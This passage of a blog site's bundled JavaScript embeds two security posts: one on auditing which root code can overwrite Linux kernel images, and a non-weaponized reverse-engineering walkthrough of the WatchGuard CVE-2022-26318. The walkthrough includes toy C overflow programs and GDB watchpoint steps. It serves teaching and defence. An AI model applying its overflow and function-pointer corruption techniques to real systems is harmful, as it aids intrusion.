    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,Zg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,Jg={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:$g},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:Xg},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:Qg},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:Zg},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:Kg},1001:{title:"CVE-2024–1001",slug:"1001",content:Fg},"0012":{title:"CVE-2024–0012",slug:"0012",content:jg},40982:{title:"CVE-2022–40982",slug:"40982",content:Vg},cow:{title:"CVE-2016–5195",slug:"cow",content:Wg},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:Yg},23397:{title:"CVE-2023–23397",slug:"23397",content:Hg},"0160":{title:"CVE-2014-0160",slug:"0160",content:Bg},11882:{title:"CVE-2017-11882",slug:"11882",content:Ug},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:qg},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:Gg}};function ey(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function ny(){const{slug:e}=sg(),n=Jg[e],t=ao.find(i=>i.slug===e),s=E.useMemo(()=>n?ey(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return E.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),E.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?y.jsxs(y.Fragment,{children:[y.jsx("header",{className:"blog-post-header",children:y.jsxs("div",{className:"container text-center",children:[y.jsx("h1",{className:"blog-post-title",children:n.title}),t&&y.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),y.jsxs("main",{className:"blog-post-content container",children:[y.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),y.jsx("section",{className:"comments",children:y.jsx("div",{className:"container",children:y.jsx("div",{className:"giscus-container"})})})]})]}):y.jsxs("main",{className:"blog-post-content container",children:[y.jsx("h2",{children:"Post not found"}),y.jsx("p",{children:"Signal lost. Let’s go back."}),y.jsx(St,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function ty(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"projects",children:y.jsx("ul",{className:"terminal-list",children:Ig.map(e=>y.jsxs("li",{children:[e.title," — ",e.description]},e.title))})})})}function sy(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"certifications",children:y.jsx("ul",{className:"terminal-list",children:zg.map(e=>y.jsxs("li",{children:[y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.title})," — ",e.details]},e.title))})})})}function ry({cve:e,onClose:n}){var t;return y.jsxs("div",{className:`cve-modal ${e?"open":""}`,"aria-label":"CVE details",children:[y.jsx("div",{className:"cve-modal__backdrop",onClick:n}),y.jsxs("div",{className:"cve-modal__card",children:[y.jsxs("div",{className:"cve-drawer__header",children:[y.jsxs("div",{children:[y.jsx("p",{className:"pill",children:"CVE Detail"}),y.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),y.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?y.jsxs("div",{className:"cve-drawer__body",children:[y.jsx("p",{className:"cve-title",children:e.title}),y.jsxs("div",{className:"cve-meta",children:[y.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),y.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),y.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),y.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),y.jsx("p",{children:e.summary}),e.metrics?y.jsxs("div",{className:"cve-meta extra",children:[y.jsxs("span",{className:"pill",children:["Total in cluster: ",e.metrics.total||"–"]}),y.jsxs("span",{className:"pill",children:["Latest: ",e.metrics.latestYear||"–"]}),y.jsxs("span",{className:"pill",children:["Max CVSS: ",e.metrics.maxCvss||"–"]})]}):null,e.href?y.jsx("div",{className:"cve-links",children:y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:"Open blog post"})}):null,(t=e.references)!=null&&t.length?y.jsxs("div",{className:"cve-links",children:[y.jsx("h4",{children:"References"}),y.jsx("ul",{children:e.references.map(s=>y.jsx("li",{children:y.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):y.jsx("p",{className:"text-muted",children:"Click a CVE node to see details."})]})]})}var iy={value:()=>{}};function lo(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new Cr(t)}function Cr(e){this._=e}function ay(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}Cr.prototype=lo.prototype={constructor:Cr,on:function(e,n){var t=this._,s=ay(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=ly(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=zc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=zc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new Cr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function ly(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function zc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=iy,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var el="http://www.w3.org/1999/xhtml";const Dc={svg:"http://www.w3.org/2000/svg",xhtml:el,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function Ei(e){var n=e+="",t=n.indexOf(":");return 